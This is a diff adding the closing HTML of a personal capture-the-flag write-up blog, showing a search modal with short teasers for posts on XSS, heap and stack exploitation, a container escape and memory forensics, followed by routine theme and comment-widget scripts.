+        <img class="searchby-algolia-logo" src="https://www.algolia.com/static_assets/images/press/downloads/algolia-light.svg">
+      </a>
+      <i class="search-icon fa fa-search"></i>
+      <form id="algolia-search-form">
+        <input type="text" id="algolia-search-input" name="search"
+          class="form-control input--large search-input" placeholder="Search" />
+      </form>
+    </div>
+    <div class="modal-body">
+      <div class="no-result text-color-light text-center">no post found</div>
+      <div class="results">
+        
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/tmnt/">
+                <h3 class="media-heading">TMNT</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     AperiCtf TMNT web 300 6       TL;DR In this challenge we need to trigger an XSS, first we need to bypass the template engine of the browser to insert custom tags in the page. We can then trigger the XSS with some specific tag and use a DOM-based JavaScript injection vulnerability.
+Step 1 This is my first web write-up, I usually prefer popping shell, but this time we will pop some alert boxes !</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/10/pwn-run-see-part-1-2/">
+                <h3 class="media-heading">Pwn Run See (part 1 &amp; 2)</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Oct 10, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     AperiCtf PwnRunSee 1 pwn 175 5   AperiCtf PwnRunSee 2 pwn 250 2    TL;DR This challenge was a use after free vulnerability which allow the user to get a shell on the remote docker after a call to execve with some user controlled parameters. Once inside the docker, we can abuse some privileges to mount the host disk inside the container and get the last flag.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/05/filereader/">
+                <h3 class="media-heading">Filereader</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     ecsc2019 filereader pwn 1000 20    TL;DR We need to exploit binary which read the content of files listed in an other file. A buffer-overflow is present in one of the function and we can leak the address of libc thanks to /proc/self/map since we can read files. A onegadget is then used to pop a shell.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2019/05/give-me-your-shell/">
+                <h3 class="media-heading">Give Me Your Shell</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  May 5, 2019
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     inshack-2019 gimme-your-shell pwn 50 67    TL;DR This is a remote buffer overflow challenge, there is no protection on the binary but ASLR is enable on the remote server. I redirected the execution flow to write my shellcode to a controled area, then jump to it and execute it.
+Getting informations First I looked at the protections on the binary :</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2018/12/mission-impossible-1/">
+                <h3 class="media-heading">Mission impossible 1</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     santhacklausctf mi1 Forensic/Crypto 800 18    TL;DR After downloading the zip file we were faced with a linux memory dump. After building the correct profile for volatility you had to perform a known plain text attack on an encrypted and splited zip file to recover the file flag.txt.
+Introduction After downloading the file MI1.zip we had a memdump.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+          <div class="media">
+            
+            <div class="media-body">
+              <a class="link-unstyled" href="https://hug0vincent.github.io/2018/12/mission-impossible-2/">
+                <h3 class="media-heading">Mission impossible 2</h3>
+              </a>
+              <span class="media-meta">
+                <span class="media-date text-small">
+                  Dec 12, 2018
+                </span>
+              </span>
+              <div class="media-content hide-xs font-merryweather">Event Challenge Category Points Solves     santhacklausctf mi2 Forensic/Crypto/network 500 22    TL;DR In the second part of the challenge we also had a memory dump of a Debian system and a network capture. When you analyse the network capture you can see that some data were exfiltrated, if you look into the memdup you can see that the tool DET (Data Exfiltration Toolkit), has been used to exfiltrate the data.</div>
+            </div>
+            <div style="clear:both;"></div>
+            <hr>
+          </div>
+        
+      </div>
+    </div>
+    <div class="modal-footer">
+      <p class="results-count text-medium"
+         data-message-zero="no post found"
+         data-message-one="1 post found"
+         data-message-other="{n} posts found">
+         6 posts found
+      </p>
+    </div>
+  </div>
+</div>
+    
+  
+    
+    <div id="cover" style="background-image:url('https://hug0vincent.github.io/images/bg2.jpg');"></div>
+  
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js" integrity="sha256-BbhdlvQf/xTY9gja0Dq3HiwQF8LaCRTXxZKRutelT44=" crossorigin="anonymous"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.12.0/highlight.min.js" integrity="sha256-/BfiIkHlHoVihZdc6TFuj7MmJ0TWcWsMXkeDFwhi0zw=" crossorigin="anonymous"></script>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/2.1.7/js/jquery.fancybox.min.js" integrity="sha256-GEAnjcTqVP+vBp3SSc8bEDQqvWAZMiHyUSIorrWwH50=" crossorigin="anonymous"></script>
+
+
+<script src="https://hug0vincent.github.io/js/script-hbdqx7wlhrscaipt6txjo74wihw1bagwt97hjgdefg9y8kq3xpotphkbsilg.min.js"></script>
+
+
+<script lang="javascript">
+window.onload = updateMinWidth;
+window.onresize = updateMinWidth;
+document.getElementById("sidebar").addEventListener("transitionend", updateMinWidth);
+function updateMinWidth() {
+  var sidebar = document.getElementById("sidebar");
+  var main = document.getElementById("main");
+  main.style.minWidth = "";
+  var w1 = getComputedStyle(main).getPropertyValue("min-width");
+  var w2 = getComputedStyle(sidebar).getPropertyValue("width");
+  var w3 = getComputedStyle(sidebar).getPropertyValue("left");
+  main.style.minWidth = `calc(${w1} - ${w2} - ${w3})`;
+}
+</script>
+
+<script>
+$(document).ready(function() {
+  hljs.configure({ classPrefix: '', useBR: false });
+  $('pre.code-highlight > code, pre > code').each(function(i, block) {
+    if (!$(this).hasClass('codeblock')) {
+      $(this).addClass('codeblock');
+    }
+    hljs.highlightBlock(block);
+  });
+});
+</script>
+
+
+  
+    
+      <script>
+        var disqus_config = function () {
+          this.page.url = 'https:\/\/hug0vincent.github.io\/2019\/10\/tmnt\/';
+          
+            this.page.identifier = '\/2019\/10\/tmnt\/'
+          
+        };
+        (function() {
+          
+          
+          if (window.location.hostname == "localhost") {
+            return;
+          }
+          var d = document, s = d.createElement('script');
+          var disqus_shortname = 'https-hug0vincent-github-io';
+          s.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+        })();
+      </script>
+    
+  
+
+
+
+
+    
+  </body>
+</html>
+
